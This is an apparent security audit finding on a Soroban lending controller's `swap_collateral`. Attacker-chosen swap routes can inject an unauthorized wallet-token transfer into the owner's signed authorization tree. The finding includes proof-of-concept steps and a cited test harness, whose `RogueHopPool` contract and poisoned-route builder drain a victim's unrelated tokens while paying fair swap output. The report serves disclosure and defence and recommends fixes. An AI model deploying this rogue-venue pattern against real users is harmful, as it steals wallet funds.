### Title
Attacker-controlled swap route can inject an unauthorized wallet-token transfer into `swap_collateral` - (File: contracts/controller/src/strategies/swap.rs)

### Summary
High severity. Controller strategy routes are opaque attacker-supplied bytes, while the controller only authorizes its own exact input transfer and measures its own token balances. A crafted route can invoke a malicious venue that requests an additional token transfer from the account owner; Soroban attaches that transfer as a child of the owner’s signed `swap_collateral` authorization. If the simulated authorization tree is signed, arbitrary wallet tokens can be stolen even though the strategy otherwise returns fair output and passes final risk checks. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` accepts caller-controlled route bytes and requires only account-owner or delegate authorization before withdrawing and routing collateral. [3](#0-2) [4](#0-3) 

`swap_tokens` authorizes exactly one `transfer(controller, router, amount_in)`, invokes `execute_strategy(controller, amount_in, swap)`, and subsequently checks only controller input/output balance deltas. [1](#0-0)  The helper grants the controller’s single nested transfer without sub-invocations, so it does not authorize or limit actions requested by route code under the original account owner’s authorization. [5](#0-4) 

Because route-selected venues are not constrained by the controller, the opaque payload can place attacker code beneath the signed controller call. The harness demonstrates a malicious hop calling `token.transfer(victim, attacker, amount)` while still paying the expected swap output. [6](#0-5)  Simulation records that rogue transfer as a child authorization under Alice’s `swap_collateral` call. [7](#0-6) 

### Impact Explanation
An attacker can steal arbitrary wallet tokens owned by the account owner, including tokens unrelated to the supplied collateral or the XOXNO position. The test demonstrates a fair-looking `swap_collateral` transaction emptying Alice’s unrelated wallet-token balance while crediting the expected ETH collateral output. [7](#0-6)  The host rejects the extra transfer when the signed tree omits it, but executes it when the simulation-generated poisoned tree is signed. [8](#0-7) 

### Likelihood Explanation
Any account owner or active delegate can reach `swap_collateral`, and equivalent route injection can be presented through `swap_debt` or `repay_debt_with_collateral`. [9](#0-8)  Exploitation requires tricking a user or client into signing the poisoned authorization tree, matching the report’s user-interaction requirement. Honest strategy trees contain no such child transfer, but a client that signs simulation output without decoding route and authorization children accepts the injected transfer. [2](#0-1) 

### Recommendation
The controller should bind strategy authorization to a route commitment that has been decoded and venue-address-constrained, or require an allowlist/commitment for every externally invoked hop. Clients should also decode `swap_xdr`, inspect every venue address, and reject any simulated authorization tree containing children other than the expected controller input transfer. Until routes are allowlisted or otherwise constrained, wallets should display all nested token transfers and block unexpected `transfer(caller, *, *)` children. [2](#0-1) [10](#0-9) 

### Proof of Concept
1. Alice supplies USDC and owns `account_id`; she also holds an unrelated wallet token.
2. The attacker supplies a `swap_collateral` route whose hop address is an attacker contract while declaring a fair USDC-to-ETH minimum output.
3. During routing, the malicious hop calls `wallet_token.transfer(alice, attacker, alice_balance)`.
4. Simulation places that transfer under Alice’s `swap_collateral` authorization tree; the controller still observes valid input spend and positive output.
5. Alice signs the returned tree. The transaction credits her account with fair ETH output and transfers her unrelated wallet-token balance to the attacker in the same execution. [11](#0-10) [7](#0-6)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-55)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/lib.rs (L255-331)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }

    /// Repays `debt` from `collateral`, netting directly for the same hub asset
    /// (`swap` must be empty) or converting otherwise. `close_position` withdraws
    /// all remaining collateral to the caller, reverting with
    /// `CannotCloseWithRemainingDebt` if any debt remains. Requires owner or
    /// delegate authorization.
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
            &env,
            &caller,
            RepayWithCollateralParams {
                account_id,
                collateral: &collateral,
                collateral_amount,
                debt: &debt,
                swap: &swap,
                close_position,
            },
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** common/src/token.rs (L33-52)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-70)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-268)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
